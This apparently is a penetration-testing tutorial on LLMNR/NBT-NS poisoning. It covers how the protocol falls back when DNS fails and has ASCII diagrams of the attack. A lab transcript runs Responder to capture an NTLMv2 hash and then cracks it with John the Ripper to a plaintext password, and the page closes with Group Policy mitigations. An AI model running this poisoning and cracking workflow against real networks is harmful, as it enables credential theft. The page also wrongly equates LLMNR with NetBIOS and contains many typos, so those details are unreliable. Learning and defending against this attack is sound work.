# Link-Local Multicast Name Resolution 

`LLMNR` is a protocol that allows both IPv4 and IPv6 hosts to `perform name resolution for hosts on the `same local network` without requiring a DNS server` or DNS configuration.

When a host’s DNS query fails (i.e., the DNS server doesn’t know the name), the host broadcasts an LLMNR request on the local network to see if any other host can answer.

LLMNR was previously known as `NetBIOS`, `NBT-NS` is a component of NetBIOS over TCP/IP (NBT) and is responsible for name registration and resolution.  

Like LLMNR, NBT-NS is a fallback protocol when DNS resolution fails. It allows local name resolution within a LAN.


# Security risk

It is vulnerable to MITM attack - LLMNR Poisioining

LLMNR has no authentication mechanism.  Anyone on network can respond to an LLMNR request, which opens the door to potential attacks. When a computer tries to resolve a domain name and fails via the standard methods (like DNS), it sends an LLMNR query across the local network.  An attacker can listen for these queries and respond to them, leading to potential unauthorized access.

Attacker runs `Responder` on network and when a LLMNR event occurs in the network and is maliciously responded to, the attacker will obtain sensitive information, including:

- The IP address of the victim 

- The domain and username of the victim 
    
- The victim’s password hash

Further he can crack this hash and gain password

# `Prerequisites`

- LLMNR or NBT-NS should no be disabled

# `Attack steps`

- Start `Responder` and wait for an event to occur

- here Event can be like , victim computer trying name resolution for something which dosent exist, so DNS will fail and then LLMNR wil broadcast it and we will get respond in responder

**************************************************************************************************
The Key Flaw - 

Key flaw in this service is when we responds to this service it responds back to us with a Username and a Password Hash which is really bad!!

Consider below example to undrstand


1. Victim tries to connect to a Shared Drive on a Server, however victim has typed the share name wrong, he is trying to connect a share //hackme but he instead typed wrongly as //hackm

                        //hackm
VICTIM MACHINE  --->---->----->--->---->---->SERVICE
                      
                      I Dont Know!
VICTIM MACHIE  <---<---<----<----<----<----<-SERVICE

2. Now since there is no such share name with //hackm, server responds that he dosent know any such thing with this name, `Which is basically a DNS Failure`

3. Now since the Victim Machine recieved a DNS Failure, the victim machine will send a Broadcast Message to everyone on the network asking about //hackme


                        //hackm
VICTIM MACHINE  --->---->----->--->---->----> Everyone
                        BROADCAST


                       I Know it!
VICTIM MACHIE  <---<---<----<----<----<----<-  HACKER
               Please send me hash/credentials
            
4. Malicious Hacker intercpets in between and sasy Hi I can connect you to this , please send me your hash/creedntials
                          OK!
VICTIM MACHINE  --->---->----->--->---->----> HACKER
                     Please take my Hash


Now the dangerous part is this hash can be taken offline and cracked, or it can be relayed without being cracked and used to gain access to machines.

So That's what LLMNR Poisoning is, we are sitting in the Middle and listening for these type of request and when the request happens we are waiting to get respond to us


We can use tool `Responder` to achieve this, Responder is a LLMNR, NBT-NS and MDNS poisoner.
https://github.com/SpiderLabs/Responder


It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service request, which is for SMB.

┌──(kali㉿kali)-[~/MobileAppSecurity/diva-apk-file/DivaApplication/lib]
└─$ sudo responder -I eth0 -dwv
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.204.130]
    Responder IPv6             [fe80::9d5c:a00d:b7e2:bfdf]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-C6JDIDMPUQ1]
    Responder Domain Name      [6KCY.LOCAL]
    Responder DCE-RPC Port     [45182]

[+] Listening for events...                                                                                          

[SMB] NTLMv2-SSP Client   : 192.168.204.136
[SMB] NTLMv2-SSP Username : DESKTOP-DIKLERO\DoshiJi
[SMB] NTLMv2-SSP Hash     : DoshiJi::DESKTOP-DIKLERO:ffe87cbac2857cdf:B2B71CD6E38A2E7B5FFF3E0FE6B53F49:010100000000000080C8A9C0657EDA01960ABE7476025748000000000200080036004B004300590001001E00570049004E002D00430036004A004400490044004D00500055005100310004003400570049004E002D00430036004A004400490044004D0050005500510031002E0036004B00430059002E004C004F00430041004C000300140036004B00430059002E004C004F00430041004C000500140036004B00430059002E004C004F00430041004C000700080080C8A9C0657EDA01060004000200000008003000300000000000000001000000002000000C697C64DB1143A2ACB60874C4ADE072FFC0CCBACAA56E2148A37FF887F7E39F0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300034002E003100330030000000000000000000  


# Now this hash can be creacked

┌──(kali㉿kali)-[~]
└─$ `echo "DoshiJi::DESKTOP-DIKLERO:a0490dd7076fe00a:8E45EA0D2717A7CFD2209BCD846EFABA:010100000000000080C8A9C0657EDA018C69C1C66DAD048A000000000200080036004B004300590001001E00570049004E002D00430036004A004400490044004D00500055005100310004003400570049004E002D00430036004A004400490044004D0050005500510031002E0036004B00430059002E004C004F00430041004C000300140036004B00430059002E004C004F00430041004C000500140036004B00430059002E004C004F00430041004C000700080080C8A9C0657EDA01060004000200000008003000300000000000000001000000002000000C697C64DB1143A2ACB60874C4ADE072FFC0CCBACAA56E2148A37FF887F7E39F0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200300034002E003100330030000000000000000000" > hash.txt`
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ `john --wordlist=/home/kali/rockyou.txt hash.txt `  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Test123          (DoshiJi)     
1g 0:00:00:06 DONE (2024-03-25 07:16) 0.1434g/s 299413p/s 299413c/s 299413C/s URBAN-GIRL..Tagme
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
     

*************************************************************************************


# Mitigation -> Main Defense – Disable LLMNR and NBT-NS

To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.

- The best defence is to disable LLMNR  

- You have to disable not only LLMNR but also NBT-NS

Beacause If DNS fails it goes to LLMNR and if LLMNR fails it goes to NBT-NS

If Company cant disable LLMNR/NBT-NS then

- They can use Network Access Control

- They should use Strong passwords